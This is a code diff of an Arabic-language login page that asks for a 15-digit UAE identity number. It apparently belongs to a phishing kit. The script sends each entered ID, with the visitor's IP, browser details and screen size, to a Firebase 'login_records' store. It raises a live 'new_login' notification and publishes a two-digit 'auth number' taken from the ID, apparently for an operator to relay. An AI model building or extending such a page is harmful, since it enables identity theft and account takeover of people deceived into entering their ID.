@@ -12,13 +12,13 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-    <script src="firebase-config.js"></script>
+    <script src="firebase-config.js?v=4"></script>
     
     <style>
         /* التنسيقات الخاصة بخانة تذكرني */
         .form-options {
             display: flex;
-            justify-content: flex-start; /* لضمان البدء من اليمين */
+            justify-content: flex-start;
             margin-bottom: 20px;
             width: 100%;
         }
@@ -26,25 +26,23 @@
         .form-check {
             display: flex;
             align-items: center;
-            gap: 8px; /* المسافة بين النص والمربع */
+            gap: 8px;
             cursor: pointer;
         }
 
-        /* تنسيق المربع ولونه */
         #rememberme {
             width: 18px;
             height: 18px;
             cursor: pointer;
-            /* تغيير لون الصح والخلفية عند التحديد للأزرق */
-            accent-color: #007bff; 
-            order: 1; /* لجعل المربع يظهر أولاً من اليمين */
+            accent-color: #007bff;
+            order: 1;
         }
 
         .checkbox-label {
             font-size: 14px;
             color: #454f63;
             cursor: pointer;
-            order: 2; /* لجعل النص يظهر بعد المربع */
+            order: 2;
             user-select: none;
         }
         
@@ -60,10 +58,72 @@
             font-size: 12px;
             z-index: 1000;
         }
+        
+        /* تنسيقات شاشة التحميل */
+        .loading-spinner {
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* نافذة تنبيه مخصصة */
+        .alert-box {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+            z-index: 2000;
+            text-align: center;
+            display: none;
+        }
+        
+        .alert-box.show {
+            display: block;
+        }
+        
+        .alert-content {
+            padding: 20px;
+        }
+        
+        .alert-buttons {
+            margin-top: 20px;
+        }
+        
+        .alert-btn {
+            padding: 10px 20px;
+            margin: 0 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        
+        .alert-btn.ok {
+            background: #4CAF50;
+            color: white;
+        }
     </style>
 </head>
 <body>
     <div class="rectangle"></div>
+    
+    <!-- نافذة التنبيه المخصصة -->
+    <div id="alertBox" class="alert-box">
+        <div class="alert-content">
+            <i class="fas fa-exclamation-triangle" style="font-size: 40px; color: #ff9800; margin-bottom: 15px;"></i>
+            <h3 id="alertTitle"></h3>
+            <p id="alertMessage"></p>
+            <div class="alert-buttons">
+                <button class="alert-btn ok" onclick="hideAlert()">موافق</button>
+            </div>
+        </div>
+    </div>
     
     <div class="main-wrapper">
         <div class="container">
@@ -79,10 +139,14 @@
             
             <div id="loadingScreen" style="display: none; text-align: center; padding: 40px 20px;">
                 <div style="font-size: 60px; color: #00ac75; margin-bottom: 20px;">
-                    <i class="fas fa-spinner fa-spin"></i>
+                    <i class="fas fa-spinner fa-spin loading-spinner"></i>
                 </div>
                 <h2 style="color: #454f63; margin-bottom: 10px;">جاري تسجيل الدخول</h2>
-                <p style="color: #78849e;" id="syncMessage">جاري حفظ البيانات في قاعدة البيانات...</p>
+                <p style="color: #78849e;" id="syncMessage">جاري الاتصال بقاعدة البيانات...</p>
+                <div id="progressBar" style="width: 100%; background: #f1f1f1; border-radius: 10px; margin-top: 20px;">
+                    <div id="progressFill" style="height: 6px; background: #4CAF50; width: 0%; border-radius: 10px; transition: width 0.3s;"></div>
+                </div>
+                <p id="progressText" style="margin-top: 10px; font-size: 14px; color: #666;">0%</p>
             </div>
             
             <main class="login-content" id="loginContent">
@@ -156,59 +220,157 @@
         </div>
     </div>
 
+    <!-- مؤشر حالة المزامنة -->
+    <div id="syncStatus" style="display: none;"></div>
+
     <script>
-        // السكريبت البرمجي الخاص بـ Firebase
+        // ========== المتغيرات العامة ==========
         const loginForm = document.getElementById('loginForm');
         const usernameInput = document.getElementById('username');
         const submitButton = document.getElementById('submitButton');
         const loginContent = document.getElementById('loginContent');
         const loadingScreen = document.getElementById('loadingScreen');
         const syncMessage = document.getElementById('syncMessage');
-
-        // دالة للحصول على IP العميل
+        const progressFill = document.getElementById('progressFill');
+        const progressText = document.getElementById('progressText');
+        
+        let isProcessing = false;
+        let firebaseInitialized = false;
+        
+        // ========== دوال التنبيه المخصصة ==========
+        function showAlert(title, message) {
+            document.getElementById('alertTitle').textContent = title;
+            document.getElementById('alertMessage').textContent = message;
+            document.getElementById('alertBox').classList.add('show');
+        }
+        
+        function hideAlert() {
+            document.getElementById('alertBox').classList.remove('show');
+        }
+        
+        // ========== دوال التقدم ==========
+        function updateProgress(percent, message) {
+            progressFill.style.width = percent + '%';
+            progressText.textContent = percent + '%';
+            if (message) {
+                syncMessage.textContent = message;
+            }
+        }
+        
+        // ========== دالة للحصول على IP العميل ==========
         async function getClientIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 return data.ip;
             } catch (error) {
+                console.warn('⚠️ لم يمكن الحصول على IP:', error);
                 return 'unknown';
             }
         }
-
-        // دالة حفظ السجل في Firebase
-        async function saveRecordToFirebase(recordData) {
+        
+        // ========== تهيئة Firebase ==========
+        async function initializeFirebaseApp() {
+            if (firebaseInitialized) return true;
+            
             try {
-                syncMessage.textContent = 'جاري الاتصال بقاعدة البيانات...';
+                console.log('🔥 محاولة تهيئة Firebase...');
                 
-                const recordRef = await firebaseConfig.db.collection('login_records').add({
+                if (typeof firebase === 'undefined') {
+                    console.error('❌ Firebase SDK غير محمل');
+                    return false;
+                }
+                
+                if (typeof initializeFirebase === 'function') {
+                    firebaseInitialized = initializeFirebase();
+                } else if (window.firebaseServices && typeof window.firebaseServices.initialize === 'function') {
+                    firebaseInitialized = window.firebaseServices.initialize();
+                } else {
+                    console.error('❌ دالة التهيئة غير موجودة');
+                    return false;
+                }
+                
+                console.log('✅ Firebase مهيئ:', firebaseInitialized);
+                return firebaseInitialized;
+            } catch (error) {
+                console.error('❌ خطأ في تهيئة Firebase:', error);
+                return false;
+            }
+        }
+        
+        // ========== دالة الحصول على خدمات Firebase ==========
+        function getFirebaseServices() {
+            // المحاولة الأولى: المتغيرات العالمية المباشرة
+            let db = window.firebaseDb;
+            let realtimeDb = window.firebaseRealtimeDb;
+            
+            // المحاولة الثانية: من خلال firebaseServices
+            if (!db && window.firebaseServices && window.firebaseServices.db) {
+                db = window.firebaseServices.db();
+            }
+            
+            if (!realtimeDb && window.firebaseServices && window.firebaseServices.realtimeDb) {
+                realtimeDb = window.firebaseServices.realtimeDb();
+            }
+            
+            return { db, realtimeDb };
+        }
+        
+        // ========== دالة حفظ السجل في Firebase ==========
+        async function saveRecordToFirebase(recordData) {
+            updateProgress(30, 'جاري الاتصال بقاعدة البيانات...');
+            
+            try {
+                // التأكد من تهيئة Firebase
+                const initialized = await initializeFirebaseApp();
+                if (!initialized) {
+                    throw new Error('فشل تهيئة Firebase');
+                }
+                
+                const { db, realtimeDb } = getFirebaseServices();
+                
+                if (!db) {
+                    throw new Error('خدمة Firestore غير متاحة');
+                }
+                
+                updateProgress(50, 'جاري حفظ البيانات في Firestore...');
+                
+                // حفظ في Firestore
+                const recordRef = await db.collection('login_records').add({
                     ...recordData,
                     createdAt: firebase.firestore.FieldValue.serverTimestamp(),
                     status: 'active',
-                    syncStatus: 'synced'
+                    syncStatus: 'synced',
+                    pageSource: 'apply.html'
                 });
                 
-                syncMessage.textContent = 'جاري تخزين البيانات...';
+                console.log('✅ تم حفظ السجل في Firestore:', recordRef.id);
+                updateProgress(70, 'تم حفظ البيانات في Firestore');
                 
-                // أيضًا نستخدم Realtime Database للإشعارات الفورية
-                await firebaseConfig.realtimeDb.ref(`notifications/${recordRef.id}`).set({
-                    idNumber: recordData.idNumber,
-                    timestamp: new Date().toISOString(),
-                    type: 'new_login',
-                    status: 'pending'
-                });
+                // حفظ في Realtime Database إذا كان متاحاً
+                if (realtimeDb) {
+                    updateProgress(80, 'جاري تحديث قاعدة البيانات الفورية...');
+                    await realtimeDb.ref(`notifications/${recordRef.id}`).set({
+                        idNumber: recordData.idNumber,
+                        timestamp: new Date().toISOString(),
+                        type: 'new_login',
+                        status: 'pending',
+                        source: 'apply_page'
+                    });
+                    
+                    console.log('✅ تم إضافة إشعار في Realtime Database');
+                }
                 
-                syncMessage.textContent = 'تم حفظ البيانات بنجاح!';
-                console.log('✅ تم حفظ السجل في Firebase:', recordRef.id);
+                updateProgress(90, 'تم تحديث قاعدة البيانات');
                 return recordRef.id;
+                
             } catch (error) {
                 console.error('❌ خطأ في حفظ السجل في Firebase:', error);
-                syncMessage.textContent = 'خطأ في الاتصال بقاعدة البيانات';
-                return null;
+                throw error;
             }
         }
-
-        // دالة لتخزين محلي مع ID Firebase
+        
+        // ========== دالة تخزين محلي مع ID Firebase ==========
         function saveRecordLocally(recordData, firebaseId) {
             const localRecords = JSON.parse(localStorage.getItem('uae_id_records') || '[]');
             
@@ -216,48 +378,95 @@
                 ...recordData,
                 firebaseId: firebaseId,
                 id: 'local_' + Date.now(),
-                syncTime: new Date().toISOString()
+                syncTime: new Date().toISOString(),
+                page: 'apply.html'
             };
             
             localRecords.push(localRecord);
             localStorage.setItem('uae_id_records', JSON.stringify(localRecords));
             
-            // تحديث آخر ID مدخل
-            localStorage.setItem('last_entered_id', recordData.idNumber);
+            // حفظ آخر ID مدخل
+            if (recordData.rememberMe) {
+                localStorage.setItem('last_entered_id', recordData.idNumber);
+            } else {
+                localStorage.removeItem('last_entered_id');
+            }
             
+            console.log('✅ تم حفظ السجل محلياً');
             return localRecord;
         }
-
-        // دالة معالجة تسجيل الدخول
+        
+        // ========== دالة حفظ رقم المصادقة ==========
+        async function saveAuthNumber(idNumber, firebaseId, localRecordId) {
+            const extractedNumber = parseInt(idNumber.substring(idNumber.length - 2)) % 100;
+            const formattedNumber = extractedNumber < 10 ? '0' + extractedNumber : extractedNumber.toString();
+            
+            const authData = {
+                number: extractedNumber,
+                formattedNumber: formattedNumber,
+                timestamp: new Date().toISOString(),
+                source: 'apply_page',
+                recordId: firebaseId || localRecordId,
+                idNumber: idNumber
+            };
+            
+            // حفظ في Firebase Realtime Database
+            const { realtimeDb } = getFirebaseServices();
+            if (realtimeDb) {
+                try {
+                    await realtimeDb.ref('current_auth_number').set(authData);
+                    console.log('✅ تم حفظ رقم المصادقة في Realtime Database');
+                } catch (error) {
+                    console.warn('⚠️ لم يمكن حفظ رقم المصادقة في Firebase:', error);
+                }
+            }
+            
+            // حفظ في localStorage
+            localStorage.setItem('auth_passcode_number', JSON.stringify(authData));
+            
+            return authData;
+        }
+        
+        // ========== معالجة تسجيل الدخول ==========
         loginForm.addEventListener('submit', async function(e) {
             e.preventDefault();
+            
+            if (isProcessing) return;
+            
             const idNumber = usernameInput.value.trim();
             const rememberMe = document.getElementById('rememberme').checked;
             
+            // التحقق من صحة الإدخال
             if (!idNumber) {
-                alert('الرجاء إدخال رقم الهوية');
-                return;
-            }
-
-            // تحقق من صحة رقم الهوية
-            if (!/^\d{15}$/.test(idNumber)) {
-                alert('رقم الهوية يجب أن يكون 15 رقمًا');
+                showAlert('خطأ في الإدخال', 'الرجاء إدخال رقم الهوية');
+                usernameInput.focus();
                 return;
             }
             
-            // إظهار شاشة التحميل
+            if (!/^\d{15}$/.test(idNumber)) {
+                showAlert('خطأ في الإدخال', 'رقم الهوية يجب أن يكون 15 رقمًا');
+                usernameInput.focus();
+                return;
+            }
+            
+            // بدء المعالجة
+            isProcessing = true;
+            submitButton.disabled = true;
             loginContent.style.display = 'none';
             loadingScreen.style.display = 'block';
-            submitButton.disabled = true;
+            updateProgress(10, 'جاري التحضير...');
             
             try {
-                // بيانات السجل
+                // جمع بيانات السجل
+                updateProgress(20, 'جاري جمع البيانات...');
+                
                 const recordData = {
                     idNumber: idNumber,
                     rememberMe: rememberMe,
                     timestamp: new Date().toISOString(),
                     userAgent: navigator.userAgent,
                     screenSize: `${window.screen.width}x${window.screen.height}`,
+                    language: navigator.language,
                     browser: {
                         name: navigator.appName,
                         version: navigator.appVersion,
@@ -265,92 +474,59 @@
                     },
                     ipAddress: await getClientIP(),
                     status: 'pending',
-                    source: 'login_page',
+                    source: 'apply_page',
                     localSave: true
                 };
                 
-                // 1. حفظ في Firebase
-                syncMessage.textContent = 'جاري الاتصال بخادم Firebase...';
-                const firebaseId = await saveRecordToFirebase(recordData);
+                // 1. محاولة الحفظ في Firebase
+                let firebaseId = null;
+                try {
+                    firebaseId = await saveRecordToFirebase(recordData);
+                    updateProgress(95, 'تم الاتصال بنجاح!');
+                } catch (firebaseError) {
+                    console.warn('⚠️ فشل الاتصال بـ Firebase، سيتم التخزين محلياً فقط:', firebaseError);
+                    updateProgress(60, 'جاري التخزين المحلي...');
+                }
                 
-                // 2. حفظ محلي مع مرجع Firebase
-                syncMessage.textContent = 'جاري التخزين المحلي...';
+                // 2. الحفظ المحلي
                 const localRecord = saveRecordLocally(recordData, firebaseId);
                 
                 // حفظ ID السجل الحالي
                 if (firebaseId) {
                     localStorage.setItem('current_record_id', firebaseId);
+                } else {
+                    localStorage.setItem('current_record_id', localRecord.id);
                 }
                 
-                // 3. إرسال رقم المصادقة إلى Realtime Database
-                const extractedNumber = parseInt(idNumber.substring(idNumber.length - 2)) % 100;
-                const formattedNumber = extractedNumber < 10 ? '0' + extractedNumber : extractedNumber.toString();
+                // 3. حفظ رقم المصادقة
+                await saveAuthNumber(idNumber, firebaseId, localRecord.id);
                 
-                await firebaseConfig.realtimeDb.ref('current_auth_number').set({
-                    number: extractedNumber,
-                    formattedNumber: formattedNumber,
-                    timestamp: new Date().toISOString(),
-                    source: 'login_page',
-                    recordId: firebaseId || localRecord.id,
-                    idNumber: idNumber
-                });
+                updateProgress(100, 'جاري التوجيه إلى صفحة النجاح...');
                 
-                // 4. حفظ في localStorage للصفحة التالية
-                localStorage.setItem('auth_passcode_number', JSON.stringify({
-                    number: extractedNumber,
-                    formattedNumber: formattedNumber,
-                    timestamp: new Date().toISOString(),
-                    source: 'login_page'
-                }));
-                
-                syncMessage.textContent = 'جاري التوجيه إلى صفحة المصادقة...';
-                
-                // 5. التوجيه بعد 2 ثانية
+                // 4. التوجيه إلى صفحة النجاح بعد تأخير قصير
                 setTimeout(() => {
-                    window.location.href = 'success.html?id=' + (firebaseId || localRecord.id);
-                }, 2000);
+                    const recordId = firebaseId || localRecord.id;
+                    window.location.href = 'success.html?id=' + encodeURIComponent(recordId) + '&source=apply';
+                }, 1500);
                 
             } catch (error) {
                 console.error('❌ خطأ في عملية التسجيل:', error);
-                syncMessage.textContent = 'حدث خطأ، جاري المحاولة محلياً...';
                 
-                // حفظ محلي فقط في حالة فشل Firebase
-                const localRecords = JSON.parse(localStorage.getItem('uae_id_records') || '[]');
-                const localRecord = {
-                    idNumber: idNumber,
-                    rememberMe: rememberMe,
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    screenSize: `${window.screen.width}x${window.screen.height}`,
-                    firebaseId: null,
-                    id: 'local_only_' + Date.now(),
-                    syncStatus: 'failed',
-                    error: error.message
-                };
+                showAlert('خطأ في النظام', 'حدث خطأ غير متوقع. الرجاء المحاولة مرة أخرى.');
                 
-                localRecords.push(localRecord);
-                localStorage.setItem('uae_id_records', JSON.stringify(localRecords));
-                localStorage.setItem('last_entered_id', idNumber);
-                
-                // استخراج الرقم للمصادقة
-                const extractedNumber = parseInt(idNumber.substring(idNumber.length - 2)) % 100;
-                const formattedNumber = extractedNumber < 10 ? '0' + extractedNumber : extractedNumber.toString();
-                
-                localStorage.setItem('auth_passcode_number', JSON.stringify({
-                    number: extractedNumber,
-                    formattedNumber: formattedNumber,
-                    timestamp: new Date().toISOString(),
-                    source: 'local_fallback'
-                }));
-                
-                setTimeout(() => {
-                    window.location.href = 'success.html?id=' + localRecord.id;
-                }, 2000);
+                // استعادة واجهة المستخدم
+                loginContent.style.display = 'block';
+                loadingScreen.style.display = 'none';
+                submitButton.disabled = false;
+                isProcessing = false;
             }
         });
-
-        // استعادة الحالة عند تحميل الصفحة
+        
+        // ========== استعادة الحالة عند تحميل الصفحة ==========
         window.addEventListener('DOMContentLoaded', function() {
+            console.log('📄 صفحة apply.html محملة');
+            
+            // استعادة آخر ID مدخل إذا كان "تذكرني" مفعل
             const lastId = localStorage.getItem('last_entered_id');
             if (lastId) {
                 usernameInput.value = lastId;
@@ -359,33 +535,91 @@
             
             // اختبار اتصال Firebase
             testFirebaseConnection();
+            
+            // تحديث حالة المزامنة
+            updateSyncStatus();
+            
+            // وضع التركيز على حقل الإدخال
+            usernameInput.focus();
         });
-
-        // دالة لاختبار اتصال Firebase
+        
+        // ========== دالة اختبار اتصال Firebase ==========
         async function testFirebaseConnection() {
             try {
-                await firebaseConfig.db.collection('test_connection').doc('ping').set({
-                    test: true,
-                    timestamp: new Date().toISOString()
-                });
-                console.log('✅ اتصال Firebase يعمل');
+                const initialized = await initializeFirebaseApp();
+                if (!initialized) {
+                    console.warn('⚠️ Firebase غير مهيئ');
+                    return;
+                }
+                
+                const { db } = getFirebaseServices();
+                if (db) {
+                    await db.collection('test_connection').doc('apply_ping').set({
+                        test: true,
+                        timestamp: new Date().toISOString(),
+                        page: 'apply.html'
+                    });
+                    console.log('✅ اتصال Firebase يعمل من apply.html');
+                }
             } catch (error) {
-                console.warn('⚠️ اتصال Firebase غير متوفر، سيتم استخدام التخزين المحلي فقط');
+                console.warn('⚠️ اتصال Firebase غير متوفر، سيتم استخدام التخزين المحلي:', error);
             }
         }
-
-        // دالة لتحديث حالة المزامنة
+        
+        // ========== دالة تحديث حالة المزامنة ==========
         function updateSyncStatus() {
             const syncStatus = document.getElementById('syncStatus');
-            if (!syncStatus) {
-                const statusDiv = document.createElement('div');
-                statusDiv.id = 'syncStatus';
-                document.body.appendChild(statusDiv);
+            if (!syncStatus) return;
+            
+            const { db, realtimeDb } = getFirebaseServices();
+            
+            if (db && realtimeDb) {
+                syncStatus.textContent = '✅ Firebase: متصل';
+                syncStatus.style.backgroundColor = 'rgba(76, 175, 80, 0.9)';
+                syncStatus.style.display = 'block';
+            } else if (db || realtimeDb) {
+                syncStatus.textContent = '⚠️ Firebase: اتصال جزئي';
+                syncStatus.style.backgroundColor = 'rgba(255, 193, 7, 0.9)';
+                syncStatus.style.display = 'block';
+            } else {
+                syncStatus.textContent = '❌ Firebase: غير متصل';
+                syncStatus.style.backgroundColor = 'rgba(244, 67, 54, 0.9)';
+                syncStatus.style.display = 'block';
             }
             
-            // يمكن تحديث هذا بناءً على حالة الاتصال
-            document.getElementById('syncStatus').textContent = 'Firebase: متصل';
+            // إخفاء مؤشر الحالة بعد 5 ثوانٍ
+            setTimeout(() => {
+                syncStatus.style.display = 'none';
+            }, 5000);
         }
+        
+        // ========== دالة للاختبار السريع من وحدة التحكم ==========
+        window.quickTestApply = async function() {
+            console.log('🔍 اختبار سريع من apply.html...');
+            
+            try {
+                const initialized = await initializeFirebaseApp();
+                if (!initialized) {
+                    return { error: 'Firebase غير مهيئ' };
+                }
+                
+                const { db, realtimeDb } = getFirebaseServices();
+                
+                const result = {
+                    firebaseInitialized: initialized,
+                    firestoreAvailable: !!db,
+                    realtimeDbAvailable: !!realtimeDb,
+                    services: getFirebaseServices(),
+                    timestamp: new Date().toISOString()
+                };
+                
+                console.log('📊 نتيجة الاختبار:', result);
+                return result;
+            } catch (error) {
+                console.error('❌ خطأ في الاختبار:', error);
+                return { error: error.message };
+            }
+        };
     </script>
 </body>
 </html>
